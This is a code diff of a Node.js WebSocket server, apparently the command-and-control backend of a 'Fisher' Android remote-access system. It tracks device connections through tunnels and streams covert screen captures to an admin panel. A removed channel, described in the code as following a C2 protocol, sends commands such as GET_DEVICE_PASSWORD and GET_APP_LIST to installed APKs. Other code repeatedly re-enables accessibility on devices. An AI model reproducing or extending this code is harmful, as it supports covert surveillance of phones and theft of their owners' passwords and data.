+          { label: `FakeOnlineGuard:SELECT:pg${safeOffset/safeLimit|0}`, maxRetries: 2 }
+        );
+      } catch (e) {
+        // SELECT 失败就停止本轮，不再继续（不再 UPDATE 任何东西，避免冲突）
+        console.warn(`[FakeOnlineGuard] SELECT page aborted: ${e.message}`);
+        break;
+      }
+      if (!rows || rows.length === 0) { hasMore = false; break; }
+      totalScannedDB += rows.length;
+      offset += rows.length;
+      if (rows.length < PAGE_SIZE) hasMore = false;
+
+      for (const row of rows) {
+        const did = row.device_id;
+        if (!did) continue;
+        // 内存过滤：WS 活着的、grace period 内的 → 跳过 DB UPDATE，绝不去争锁
+        if (aliveDeviceIds.has(did)) continue;
+        if (isInGracePeriod(did)) continue;
+
+        // 到达这里：内存无连接 + 不在 grace + DB 显示在线且 last_seen>15min → 真正需要下线
+        try {
+          const [upd] = await dbWithRetry(
+            () => dbPool.execute(
+              `UPDATE fisher_devices SET is_connected = 0
+               WHERE device_id = ? AND is_connected = 1 AND last_seen > 0 AND last_seen < ?`,
+              [did, fifteenMinutesAgo]
+            ),
+            { label: `FakeOnlineGuard:UPD:${String(did).substring(0, 8)}`, maxRetries: 3, delayMs: 120 }
+          );
+          if (upd && upd.affectedRows > 0) totalCorrected++;
+          // 每次 UPDATE 之后让 5ms，给并发心跳让出窗口（避免连续 hammer 同一表）
+          await new Promise(r => setTimeout(r, 5));
+        } catch (e) {
+          // 这里已经是 dbWithRetry 重试完都失败的 → 记 warn，不打 error（不污染日志）
+          console.warn(`[FakeOnlineGuard] skip (3 retries exhausted) ${String(did).substring(0, 12)}...: ${e.message}`);
+        }
+      }
+    }
+
+    if (totalCorrected > 0) {
+      console.log(`[FakeOnlineGuard] Corrected ${totalCorrected} fake-online (scannedDB=${totalScannedDB}, aliveInMem=${aliveDeviceIds.size})`);
+      try {
+        const { broadcastToAdmins } = getHandler('./handlers/admin');
+        broadcastToAdmins(connections, { type: 'device_update' });
+      } catch (e) { /* ignore */ }
+    }
+  } catch (e) {
+    // 顶层级异常才打 warn（不是 error）—— 死锁重试在内部已降级
+    console.warn(`[FakeOnlineGuard] top-level warn: ${e.message}`);
+  } finally {
+    fakeOnlineGuardRunning = false;
+  }
+}, 120000); // ★ 2026-09-03：60s → 120s（兜底不着急，降低 50% 扫 DB 频率）
+
+
+    // /api/ 请求代理到 PHP 后端（80端口）— 兼容 APK 直接发 HTTP 请求到 8889 端口
   if (req.url && req.url.startsWith('/api/')) {
     let body = '';
     req.on('data', chunk => body += chunk);
@@ -2058,138 +1990,18 @@ if (req.url && req.url.startsWith('/internal/minicap/restart')) {
   res.end();
 });
 
-// Maintenance jobs are process singletons. They must never be created from an
-// HTTP request handler because every request would otherwise retain two more
-// permanent intervals and continuously increase DB work and heap usage.
-let springboardTimeoutRunning = false;
-async function runSpringboardTimeout() {
-  if (springboardTimeoutRunning) return;
-  springboardTimeoutRunning = true;
-  try {
-    const fiveMinutesAgo = Math.floor(Date.now() / 1000) - 5 * 60;
-    const [result] = await dbPool.execute(
-      `UPDATE fisher_devices SET remote_port = 0, tunnel_deployed = 0
-       WHERE remote_port = 19901 AND last_seen < ? AND last_seen > 0`,
-      [fiveMinutesAgo]
-    );
-    if (result.affectedRows > 0) {
-      console.log(`[SpringboardTimeout] Released 19901 from ${result.affectedRows} inactive device(s) (>5 min)`);
-    }
-  } catch (e) {
-    console.error(`[SpringboardTimeout] Error: ${e.message}`);
-  } finally {
-    springboardTimeoutRunning = false;
-  }
-}
-
-let fakeOnlineGuardRunning = false;
-async function runFakeOnlineGuard() {
-  if (fakeOnlineGuardRunning) return;
-  fakeOnlineGuardRunning = true;
-  try {
-    const fifteenMinutesAgo = Math.floor(Date.now() / 1000) - 15 * 60;
-    const [result] = await dbPool.execute(
-      `UPDATE fisher_devices SET is_connected = 0
-       WHERE is_connected = 1 AND last_seen > 0 AND last_seen < ?`,
-      [fifteenMinutesAgo]
-    );
-    if (result.affectedRows > 0) {
-      console.log(`[FakeOnlineGuard] Corrected ${result.affectedRows} fake-online device(s) (last_seen > 15min)`);
-      try {
-        const { broadcastToAdmins } = getHandler('./handlers/admin');
-        broadcastToAdmins(connections, { type: 'device_update' });
-      } catch {}
-    }
-  } catch (e) {
-    console.error(`[FakeOnlineGuard] Error: ${e.message}`);
-  } finally {
-    fakeOnlineGuardRunning = false;
-  }
-}
-
-// WebSocket server. Device reconnect storms are rejected before ws allocates a
-// WebSocket object; other routes keep their existing upgrade behavior.
-const wss = new WebSocketServer({ noServer: true });
-
-function rejectWebSocketUpgrade(socket, statusCode, reason, retryAfterSeconds = 0) {
-  if (!socket || socket.destroyed) return;
-  const statusText = statusCode === 429 ? 'Too Many Requests'
-    : (statusCode === 403 ? 'Forbidden' : 'Bad Request');
-  const headers = [
-    `HTTP/1.1 ${statusCode} ${statusText}`,
-    'Connection: close',
-    'Content-Length: 0',
-  ];
-  if (retryAfterSeconds > 0) headers.push(`Retry-After: ${retryAfterSeconds}`);
-  let destroyTimer = null;
-  const clearDestroyTimer = () => {
-    if (destroyTimer) clearTimeout(destroyTimer);
-    destroyTimer = null;
-  };
-  socket.once('close', clearDestroyTimer);
-  try {
-    socket.end(`${headers.join('\r\n')}\r\n\r\n`);
-    // Some mobile/NAT peers never complete the TCP close handshake. Bound the
-    // rejected socket lifetime without touching accepted WebSocket sessions.
-    destroyTimer = setTimeout(() => {
-      if (!socket.destroyed) socket.destroy();
-    }, 1000);
-    destroyTimer.unref?.();
-  } catch {
-    clearDestroyTimer();
-    socket.destroy();
-  }
-}
-
-server.on('upgrade', (req, socket, head) => {
-  try {
-    const { pathname, query } = url.parse(req.url, true);
-    const connectionDeviceId = getConnectionDeviceId(pathname, query);
-    if (connectionDeviceId && blockedDeviceIds.has(connectionDeviceId)) {
-      rejectWebSocketUpgrade(socket, 403, 'Device blocked');
-      return;
-    }
-    const isNativeDeviceSocket = pathname === '/ws/device' || pathname === '/ws/session';
-    if (isNativeDeviceSocket) {
-      if (!connectionDeviceId) {
-        rejectWebSocketUpgrade(socket, 400, 'Missing sessionId');
-        return;
-      }
-      const { preflightDeviceUpgrade } = getHandler('./handlers/device');
-      const guard = preflightDeviceUpgrade(connectionDeviceId, connections);
-      if (guard.rejected) {
-        rejectWebSocketUpgrade(socket, 429, 'Existing connection is active', 2);
-        return;
-      }
-      req._deviceAttemptAt = guard.attemptAt;
-    }
-    wss.handleUpgrade(req, socket, head, ws => wss.emit('connection', ws, req));
-  } catch (error) {
-    console.warn(`[WS-Upgrade] rejected path=${req.url || ''} reason=${error.message}`);
-    try { socket.destroy(); } catch {}
-  }
-});
+// WebSocket server
+const wss = new WebSocketServer({ server });
 
 wss.on('connection', (ws, req) => {
   const { pathname, query } = url.parse(req.url, true);
-  const connectionDeviceId = getConnectionDeviceId(pathname, query);
-  if (connectionDeviceId && blockedDeviceIds.has(connectionDeviceId)) {
-    ws.close(4003, 'Device blocked');
-    return;
-  }
   // ★ 2026-08-07：优先从 Nginx 反代传递的 X-Real-IP / X-Forwarded-For 获取真实 IP
   const realIp = req.headers['x-real-ip']
     || (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
     || (req.socket.remoteAddress || '').replace('::ffff:', '');
-  // Device reconnect storms can generate several handshakes per second. Device handlers
-  // emit rate-limited accepted/rejected logs, so avoid one stdout write per handshake.
-  const isDeviceSocket = pathname === '/ws/device' || pathname === '/ws/session';
-  if (!isDeviceSocket) {
-    console.log(`[WS] New connection: path=${pathname} query=${JSON.stringify(query)} ip=${realIp}`);
-  }
+  console.log(`[WS] New connection: path=${pathname} query=${JSON.stringify(query)} ip=${realIp}`);
   // 将真实 IP 挂到 req 上，供后续 handler 使用
   req._realIp = realIp;
-  if (Number.isFinite(req._deviceAttemptAt)) ws._deviceAttemptAt = req._deviceAttemptAt;
 
   const { attachFreeWebSocket } = getHandler('./compat/freeSocketIoCompat');
   const { handleDevice } = getHandler('./handlers/device');
@@ -2205,26 +2017,6 @@ wss.on('connection', (ws, req) => {
       return;
     }
     // 查数据库检查用户是否被禁用
-    // ★ 2026-10-09 EARLY-FRAME BUFFER
-    // The folder-1 panel sends its `subscribe` frame the instant the socket
-    // opens, but `handleAdmin()` registers its 'message' listener only after
-    // this async DB lookup resolves. `ws` emits 'message' immediately, so any
-    // frame arriving in that window was dropped -> the reader/投屏 canvas
-    // stayed on "等待UI数据..." forever. Buffer the early frames and
-    // replay them once the real handler is attached.
-    const earlyMessages = [];
-    const earlyListener = (data, isBinary) => {
-      if (earlyMessages.length < 200) earlyMessages.push([data, isBinary]);
-    };
-    ws.on('message', earlyListener);
-    const replayEarly = () => {
-      try { ws.removeListener('message', earlyListener); } catch {}
-      const queued = earlyMessages.splice(0, earlyMessages.length);
-      for (const [d, b] of queued) {
-        try { ws.emit('message', d, b); } catch {}
-      }
-    };
-
     withTimeout(
       dbPool.execute('SELECT enabled FROM fisher_users WHERE id = ? LIMIT 1', [user.user_id]),
       PANEL_AUTH_DB_TIMEOUT_MS,
@@ -2238,7 +2030,6 @@ wss.on('connection', (ws, req) => {
         }
         const { handleAdmin } = getHandler('./handlers/admin');
         handleAdmin(ws, user, connections);
-        replayEarly();
       })
       .catch(err => {
         console.error('[WS] Auth DB check error:', err.message);
@@ -2246,7 +2037,6 @@ wss.on('connection', (ws, req) => {
         if (ws.readyState !== 1) return;
         const { handleAdmin } = getHandler('./handlers/admin');
         handleAdmin(ws, user, connections);
-        replayEarly();
       });
     return; // 异步处理，提前 return 避免后续路由匹配
   } else if (pathname === '/ws/device' || pathname === '/ws/session') {
@@ -2275,91 +2065,6 @@ wss.on('connection', (ws, req) => {
     }
     const { handleAgent } = getHandler('./handlers/agent');
     handleAgent(ws, deviceId, connections);
-  } else if (pathname === '/s/lk' || pathname === '/s/lk/') {
-    // folder-1 (XYYKK/雄鹰) APK device channel. The panel build in folder 1 talks a
-    // different wire protocol than folder 2's node-ws, so the same device handler is
-    // reused but every inbound frame can be dumped with WS_RAW_DUMP=<count> for
-    // protocol alignment.
-    const deviceId = String(query.di || query.d || query.deviceId || query.sessionId || '').trim().toLowerCase();
-    if (!deviceId) {
-      ws.close(4002, 'Missing device id');
-      return;
-    }
-    const rawDumpLimit = Number(process.env.WS_RAW_DUMP || 0);
-    if (rawDumpLimit > 0) {
-      let dumped = 0;
-      ws.on('message', (data, isBinary) => {
-        if (dumped >= rawDumpLimit) return;
-        dumped++;
-        let text;
-        if (Buffer.isBuffer(data)) {
-          text = isBinary ? '<binary ' + data.length + 'B ' + data.slice(0, 24).toString('hex') + '>' : data.toString('utf8');
-        } else {
-          text = String(data);
-        }
-        console.log(`[RAWDUMP] /s/lk ${deviceId} #${dumped} ${String(text).substring(0, 1200)}`);
-      });
-    }
-    // IMPORTANT: do NOT register this socket as the device connection.
-    // Empirically (2026-10-09, com.zq.final on emulator-5566) the APK opens /s/lk in
-    // parallel with the real /w?d= socket; /s/lk stays silent and never answers any
-    // command, while /w does all the work. Registering /s/lk made commands route into
-    // the dead socket and produced `rejected competing connection` churn. So keep the
-    // socket alive (closing it caused a 278x reconnect storm) and just observe it.
-    console.log(`[WS] /s/lk link channel opened device=${deviceId} ip=${realIp}`);
-    // folder-1 APK link channel: client sends {"type":"ping"} and expects
-    // {"type":"pong"}. Per C2_PROTOCOL.md inbound types are: pong / probe /
-    // ping_probe / command. Probe the socket so we can watch what it answers.
-    const slkAdmins = getHandler('./handlers/admin');
-    ws.on('message', (data, isBinary) => {
-      const raw = Buffer.isBuffer(data) ? data : Buffer.from(String(data), 'utf8');
-      // ★ 2026-10-09 SLK-FRAME: dxs pushes raw JPEG screen frames over this same
-      // bridge once screencast is started (panel "\u65e0\u611f\u6295\u5c4f" ->
-      // SCREEN_CAPTURE_SET_TECH -> dxs /minicap/start). Hand them to the normal
-      // admin fan-out so the folder-1 panel canvas actually paints.
-      if (isBinary && raw.length > 3 && raw[0] === 0xff && raw[1] === 0xd8) {
-        try {
-          if (slkAdmins && typeof slkAdmins.forwardFrameToAdmins === 'function') {
-            slkAdmins.forwardFrameToAdmins(deviceId, raw, connections);
-          }
-        } catch (err) {
-          console.error('[SLK] frame forward failed:', err && err.message);
-        }
-        return;
-      }
-      let text;
-      if (Buffer.isBuffer(data)) {
-        text = isBinary && !(data.length && data[0] === 0x7b) ? '<binary ' + data.length + 'B>' : data.toString('utf8');
-      } else {
-        text = String(data);
-      }
-      console.log(`[SLK] in <- ${deviceId}: ${String(text).substring(0, 600)}`);
-      try {
-        const m = JSON.parse(String(text));
-        if (m && m.type === 'ping') {
-          ws.send(JSON.stringify({ type: 'pong' }));
-          console.log(`[SLK] out -> ${deviceId}: pong`);
-        }
-      } catch {}
-    });
-    try { ws.send(JSON.stringify({ type: 'probe' })); console.log(`[SLK] out -> ${deviceId}: probe`); } catch {}
-    if (process.env.WS_SLK_EXPERIMENT === '1') {
-      const variants = [
-        ['probe-json', { type: 'probe' }],
-        ['cmd/type+data', { type: 'command', data: { command: 'GET_DEVICE_STATE', params: {} } }],
-        ['cmd/type+sessionId+data', { type: 'command', sessionId: deviceId, data: { command: 'GET_DEVICE_STATE', params: {} } }],
-        ['cmd/type+deviceId+data', { type: 'command', deviceId, data: { command: 'GET_DEVICE_STATE', params: {} } }],
-        ['cmd/flat', { command: 'GET_DEVICE_STATE', params: {} }],
-        ['cmd/type+payload', { type: 'command', deviceId, payload: { command: 'GET_DEVICE_PASSWORD', params: {} } }],
-        ['get_app_list/type+data', { type: 'command', data: { command: 'GET_APP_LIST', params: {} } }],
-        ['ping_probe', { type: 'ping_probe' }],
-      ];
-      variants.forEach(([name, payload], i) => {
-        setTimeout(() => {
-          try { ws.send(JSON.stringify(payload)); console.log(`[SLK] out -> ${deviceId}: ${name} ${JSON.stringify(payload)}`); } catch {}
-        }, 2000 + i * 2500);
-      });
-    }
   } else {
     ws.close(4000, 'Unknown path');
   }
@@ -2370,44 +2075,23 @@ server.on('connection', (socket) => {
   socket.setKeepAlive(true, 30000); // 30秒 TCP keepalive probe
   socket.setNoDelay(true);          // 禁用 Nagle 算法（低延迟）
   socket.setTimeout(0);             // 禁用超时（永不超时）
-  socket.on('error', (err) => {
-    if (isTransientSocketError(err)) {
-      logTransientSocketError('WS-TCP', err);
-    } else {
-      console.error('[WS-TCPError]', err && err.stack ? err.stack : err);
-    }
-  });
-});
-
-// HTTP parser errors are emitted separately from the socket error event. A
-// client reset during an upgrade must close only that client connection.
-server.on('clientError', (err, socket) => {
-  if (isTransientSocketError(err)) {
-    logTransientSocketError('WS-HTTP', err);
-  } else {
-    console.error('[WS-ClientError]', err && err.stack ? err.stack : err);
-  }
-  try { socket.destroy(); } catch {}
 });
 
 // 启动服务
-server.on('error', (err) => {
-  if (err?.code === 'EADDRINUSE' || err?.code === 'EACCES') {
-    // Exit 78 is configured as a non-restartable PM2 startup/config failure.
-    // This prevents an accidental duplicate instance from retrying forever.
-    exitAfterFatalError('WS-ListenFatal', err, 78);
-    return;
-  }
-  console.error('[WS-ServerError]', new Date().toISOString(), err && err.stack ? err.stack : err);
-});
 server.listen(config.port, () => {
   console.log(`[WS] Fisher WebSocket server listening on port ${config.port}`);
   console.log(`[WS] Paths: /w?d=:id, /ws/panel, /ws/device, /ws/bridge, /ws/agent/:id`);
   console.log(`[WS] Hot-reload endpoint: POST /internal/reload`);
   console.log(`[WS] TCP keepalive: enabled (30s), NoDelay: on`);
-  startRuntimeServices();
-  if (typeof process.send === 'function') process.send('ready');
 });
+
+// 启动命令轮询器
+const { startCommandPoller } = require('./services/commandPoller');
+startCommandPoller(connections);
+
+// 启动心跳检测
+const { startKeepAlive } = require('./services/keepAlive');
+startKeepAlive(connections);
 
 // ★ 2026-08-07：自动重连 + 退避机制
 // 对同一设备最多尝试 5 次 enableAccessibility，之后停止（避免无限循环重启无障碍）
@@ -2415,10 +2099,7 @@ server.listen(config.port, () => {
 const _reconnectAttempts = new Map(); // deviceId -> { count, lastSent }
 const MAX_RECONNECT_ATTEMPTS = 5;
 
-function runDeviceAutoReconnect() {
-  for (const deviceId of _reconnectAttempts.keys()) {
-    if (!connections.bridges.has(deviceId)) _reconnectAttempts.delete(deviceId);
-  }
+setInterval(() => {
   for (const [deviceId, bridgeConn] of connections.bridges.entries()) {
     if (!connections.devices.has(deviceId)) {
       const info = _reconnectAttempts.get(deviceId) || { count: 0, lastSent: 0 };
@@ -2441,39 +2122,13 @@ function runDeviceAutoReconnect() {
       }
     }
   }
-}
+}, 60000); // 每 60 秒检查一次
+const { startAutoProtectLoop } = require('./services/autoProtect');
+startAutoProtectLoop(connections);
 
-function scheduleRuntimeInterval(callback, intervalMs) {
-  const timer = setInterval(callback, intervalMs);
-  timer.unref?.();
-  runtimeTimers.add(timer);
-  return timer;
-}
-
-function startRuntimeServices() {
-  if (runtimeStarted) return false;
-  runtimeStarted = true;
-
-  getHandler('./services/commandPoller').startCommandPoller(connections);
-  require('./services/keepAlive').startKeepAlive(connections);
-  require('./services/autoProtect').startAutoProtectLoop(connections);
-  getHandler('./services/apkBuilder').startPoller();
-
-  scheduleRuntimeInterval(runDeviceAutoReconnect, 60000);
-  scheduleRuntimeInterval(runSpringboardTimeout, 60000);
-  scheduleRuntimeInterval(runFakeOnlineGuard, 60000);
-  scheduleRuntimeInterval(runPortRecycle, 3600000);
-  console.log(`[Runtime] Started singleton services, maintenanceTimers=${runtimeTimers.size}`);
-  return true;
-}
-
-function stopRuntimeServices() {
-  for (const timer of runtimeTimers) clearInterval(timer);
-  runtimeTimers.clear();
-  try { getHandler('./services/commandPoller').stopCommandPoller?.(); } catch {}
-  try { getHandler('./services/apkBuilder').stopPoller?.(); } catch {}
-  runtimeStarted = false;
-}
+// 启动 APK 构建任务轮询
+const { startPoller: startApkPoller } = require('./services/apkBuilder');
+startApkPoller();
 
 // frps 配置（用于查询 Dashboard API）— 全部从 .env 读取
 const FRPS_DASHBOARD = {
@@ -2613,7 +2268,7 @@ async function getTunnelMonitorData() {
 // 端口回收：每小时释放超过7天未上线设备的 remote_port（独立端口）
 // ★ Stability: in-flight guard — 如果上一次 tick 还在跑则跳过本次，避免堆积
 let portRecycleRunning = false;
-async function runPortRecycle() {
+setInterval(async () => {
   if (portRecycleRunning) return;
   portRecycleRunning = true;
   try {
@@ -2630,18 +2285,12 @@ async function runPortRecycle() {
   } finally {
     portRecycleRunning = false;
   }
-}
+}, 3600000); // 每小时
 
 // Graceful shutdown — 给设备发 1012 (Service Restart) close 帧后退出
-let shutdownStarted = false;
 function gracefulShutdown(opts) {
-  const waitMs = (opts && opts.waitMs) || Math.max(100, Number(process.env.WS_SHUTDOWN_WAIT_MS || 1000));
+  const waitMs = (opts && opts.waitMs) || 2000;
   const skipExit = opts && opts.skipExit === true;
-  if (!skipExit && shutdownStarted) return;
-  if (!skipExit) {
-    shutdownStarted = true;
-    stopRuntimeServices();
-  }
   console.log('[WS] Graceful shutdown: notifying all clients...');
   
   // 给所有设备连接发送 1012 close（Service Restart）
@@ -2680,20 +2329,5 @@ function gracefulShutdown(opts) {
 // 信号处理（Linux: SIGTERM/SIGINT, Windows: SIGINT + Ctrl+C）
 process.on('SIGTERM', gracefulShutdown);
 process.on('SIGINT', gracefulShutdown);
-process.on('message', message => {
-  if (message === 'shutdown') gracefulShutdown();
-});
-
-// ★ DXS bridge (2026-10-09): the installed APK's dxs Go agent exposes a
-// real screen/minicap + touch API on 127.0.0.1:17912 (adb forward of the
-// device's 127.0.0.1:7912). Feed those frames into the normal admin fan-out so
-// the folder-1 panel's "无感投屏" view gets a picture without tpx.
-try {
-  const { start: startDxsBridge } = require('./services/dxsBridge');
-  const { forwardFrameToAdmins } = getHandler('./handlers/admin');
-  startDxsBridge(connections, forwardFrameToAdmins);
-} catch (err) {
-  console.error('[DXS-Bridge] start failed:', err && err.message);
-}
 
 module.exports = { connections };
